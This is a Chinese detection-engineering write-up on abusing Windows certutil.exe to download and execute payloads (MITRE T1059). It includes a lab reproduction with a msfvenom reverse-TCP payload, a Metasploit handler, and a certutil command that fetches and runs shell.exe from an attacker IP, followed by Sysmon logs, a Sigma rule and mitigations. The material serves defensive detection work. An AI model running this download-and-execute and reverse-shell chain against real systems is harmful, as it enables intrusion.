# T1059-Win-使用Certutil.exe执行Payload（白名单）

## 描述

攻击者可能利用命令行界面工具（如Windows的`certutil.exe`）与系统交互，执行任务或启动恶意软件，以实现信息收集、恶意代码执行或横向移动（T1059）。`certutil.exe`是Windows操作系统中作为证书服务的一部分安装的命令行工具，官方用途包括管理证书、检查证书吊销列表（CRL）等。然而，攻击者可滥用其功能（如`-urlcache`选项）从远程服务器下载文件并执行，从而绕过传统安全检测。由于`certutil.exe`是白名单进程，其行为可能被误认为是合法操作，增加检测难度。

常见的攻击场景包括使用`certutil.exe`下载恶意Payload（如`shell.exe`）并通过命令链式执行（如`&`）运行，结合Meterpreter反弹Shell。检测重点在于监控`certutil.exe`的异常命令行参数和后续进程行为。

## 测试案例

1. **下载并执行恶意EXE**  
   攻击者使用`certutil.exe`从远程服务器下载恶意EXE文件并执行，获取Meterpreter会话。

2. **隐藏Payload执行**  
   攻击者通过`certutil.exe`下载Base64编码的Payload并解码执行，规避检测。

## 检测日志

**Windows安全日志**  
- **事件ID 4688**：记录进程创建，包含`certutil.exe`的命令行参数（需启用命令行记录）。  
- **事件ID 4689**：记录进程终止，可能用于关联进程生命周期。

**Sysmon日志**  
- **事件ID 1**：记录进程创建，包含`certutil.exe`的完整命令行和父进程信息。  
- **事件ID 3**：记录网络连接，可能涉及`certutil.exe`发起的HTTP请求。  
- **事件ID 11**：记录文件创建或写入，可能涉及下载的Payload文件。

**配置日志记录**  
- 启用命令行参数记录：  
  - 路径：`本地计算机策略 > 计算机配置 > 管理模板 > 系统 > 审核进程创建 > 在进程创建事件中加入命令行 > 启用`（Windows Server 2008及以上）。  
- 部署Sysmon以增强进程、文件和网络活动监控。

## 测试复现

### 环境准备
- **攻击机**：Kali Linux 2019，安装Metasploit Framework和Python 2。  
- **靶机**：Windows 7，安装Sysmon并启用Windows安全日志。  
- **网络**：确保攻击机和靶机可通信（HTTP端口8000，Shell端口1234）。  

### 攻击步骤
1. **生成Payload**  
   在攻击机上使用`msfvenom`生成恶意可执行文件：
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.126.146 lport=1234 -f exe > shell.exe
   ```

2. **设置Metasploit监听**  
   在攻击机上配置并启动Metasploit handler：
   ```bash
   msf5 > use exploit/multi/handler
   msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
   msf5 exploit(multi/handler) > set lhost 192.168.126.146
   msf5 exploit(multi/handler) > set lport 1234
   msf5 exploit(multi/handler) > exploit
   [*] Started reverse TCP handler on 192.168.126.146:1234
   ```

3. **开启HTTP服务**  
   在攻击机上启动简单HTTP服务器：
   ```bash
   python2 -m SimpleHTTPServer 8000
   Serving HTTP on 0.0.0.0 port 8000 ...
   ```

4. **靶机执行Payload**  
   在靶机上运行以下命令下载并执行Payload：
   ```dos
   certutil.exe -urlcache -split -f http://192.168.126.146:8000/shell.exe shell.exe & shell.exe
   ```

5. **验证反弹Shell**  
   检查Metasploit终端，确认收到反弹Shell：
   ```bash
   [*] Started reverse TCP handler on 192.168.126.146:1234
   [*] Sending stage (180291 bytes) to 192.168.126.149
   [*] Meterpreter session 1 opened (192.168.126.146:1234 -> 192.168.126.149:49172) at 2025-06-06 23:01 PDT
   ```

**注意**：此复现仅用于学习和测试目的，需在合法授权的测试环境中进行，切勿用于非法活动。

## 测试留痕

- **Sysmon日志（事件ID 1）**：
  ```plaintext
  EventID: 1
  Image: C:\Windows\System32\certutil.exe
  FileVersion: 6.1.7600.16385
  Description: CertUtil.exe
  CommandLine: certutil.exe -urlcache -split -f http://192.168.126.146:8000/shell.exe shell.exe & shell.exe
  User: <domain>\12306Br0
  IntegrityLevel: Medium
  ```
- **Windows安全日志（事件ID 4688，启用命令行记录）**：
  ```plaintext
  EventID: 4688
  New Process ID: 0xbcc
  New Process Name: C:\Windows\System32\certutil.exe
  Process Command Line: certutil.exe -urlcache -split -f http://192.168.126.146:8000/shell.exe shell.exe & shell.exe
  Creator Process Name: C:\Windows\System32\cmd.exe
  Token Elevation Type: TokenElevationTypeLimited (3)
  ```
- **Sysmon日志（事件ID 3）**：
  ```plaintext
  EventID: 3
  Image: C:\Windows\System32\certutil.exe
  DestinationIp: 192.168.126.146
  DestinationPort: 8000
  Protocol: tcp
  ```
- **Sysmon日志（事件ID 11）**：
  ```plaintext
  EventID: 11
  Image: C:\Windows\System32\certutil.exe
  TargetFilename: C:\Windows\shell.exe
  CreationUtcTime: 2025-06-06 23:01:15Z
  ```

## 检测规则/思路

**检测规则**  
通过分析Sysmon和Windows安全日志，检测`certutil.exe`执行Payload的异常行为。以下是具体思路：

1. **日志分析**：
   - 收集Sysmon事件ID 1或Windows安全事件ID 4688，提取`certutil.exe`的命令行参数，重点关注`-urlcache`、`-split`、`-f`及HTTP URL。  
   - 监控Sysmon事件ID 3，检测`certutil.exe`发起的HTTP请求。  
   - 监控Sysmon事件ID 11，检测下载文件的创建或写入。

2. **Sigma规则**：
   ```yaml
   title: 可疑的Certutil命令执行Payload
   id: 2b3c4d5e-6f7a-8b9c-0d1e-2f3c4d5e6f7a
   status: stable
   description: 检测certutil.exe执行可疑命令（如下载并运行Payload），可能表明恶意行为
   references:
     - https://attack.mitre.org/techniques/T1059/
     - https://lolbas-project.github.io/lolbas/Binaries/Certutil/
   tags:
     - attack.execution
     - attack.defense_evasion
     - attack.t1059
     - attack.t1140
     - attack.t1105
   logsource:
     category: process_creation
     product: windows
   detection:
     selection:
       Image|endswith: '\certutil.exe'
       CommandLine|contains:
         - '-urlcache'
         - '/urlcache'
         - '-split'
         - '/split'
         - '-f'
         - '/f'
         - 'http'
     condition: selection
   fields:
     - CommandLine
     - ParentCommandLine
   falsepositives:
     - 合法的证书管理或CRL检查
     - 管理员运行的维护脚本
   level: high
   ```

3. **SIEM规则**：
   - 检测`certutil.exe`的异常下载行为。
   - 示例Splunk查询：
     ```spl
     source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image="*\certutil.exe" (CommandLine="*urlcache*" OR CommandLine="*split*" OR CommandLine="*-f*" OR CommandLine="*http*") | stats count by Image, CommandLine, ComputerName, User
     ```

4. **网络流量分析**：
   - 监控`certutil.exe`发起的HTTP/HTTPS请求，检测可疑URL。  
   - 示例Wireshark过滤器：
     ```plaintext
     http.request and ip.src == <target_ip> and http.request.uri contains ".exe"
     ```

5. **文件系统监控**：
   - 检测`certutil.exe`下载的文件是否被执行。
   - 示例Sysmon配置：
     ```xml
     <Sysmon schemaversion="4.81">
       <EventFiltering>
         <FileCreate onmatch="include">
           <TargetFilename condition="contains">shell.exe</TargetFilename>
         </FileCreate>
       </EventFiltering>
     </Sysmon>
     ```

6. **威胁情报整合**：
   - 检查`certutil.exe`访问的URL、IP或下载文件的哈希值是否与已知恶意活动相关，结合威胁情报平台（如VirusTotal、AlienVault）。

## 建议

### 缓解措施

防御`certutil.exe`的恶意使用需从权限控制、系统加固和监控入手：

1. **限制Certutil执行**  
   - 配置AppLocker或组策略，限制非管理员用户运行`certutil.exe`。  

2. **禁用不必要的功能**  
   - 限制`certutil.exe`的网络访问功能（如`-urlcache`），通过组策略或脚本拦截相关命令。

3. **网络访问控制**  
   - 配置防火墙，限制`certutil.exe`的出站HTTP/HTTPS连接，仅允许白名单域名。  
   - 使用代理服务器监控和过滤`certutil.exe`的网络流量。

4. **凭据保护**  
   - 启用多因素认证（MFA）保护管理员账户。  
   - 实施强密码策略，避免凭据泄露。

5. **日志和监控**  
   - 启用命令行参数记录，增强Windows安全日志（事件ID 4688）或Sysmon（事件ID 1/3/11）监控。  
   - 配置SIEM检测`certutil.exe`的异常命令行和下载行为。

6. **定期审计**  
   - 使用Sysinternals Process Monitor检查`certutil.exe`的进程活动，识别异常文件操作或网络请求。

### 检测

检测工作应集中在`certutil.exe`的异常下载和执行行为上，包括但不限于：  
- **进程行为监控**：分析Sysmon或Windows安全日志，检测`certutil.exe`使用`-urlcache`或`-split`参数。  
- **网络流量监控**：检查`certutil.exe`发起的HTTP/HTTPS请求，识别可疑URL。  
- **文件系统监控**：检测下载文件（如`shell.exe`）的创建和执行。  
- **威胁情报整合**：结合威胁情报，检查下载的URL或文件是否与已知恶意活动相关。

## 参考推荐

- MITRE ATT&CK: T1059  
  <https://attack.mitre.org/techniques/T1059/>  
- LOLBAS Project: Certutil  
  <https://lolbas-project.github.io/lolbas/Binaries/Certutil/>  
- Certutil Usage  
  <https://blogs.technet.microsoft.com/pki/2006/11/30/basic-crl-checking-with-certutil/>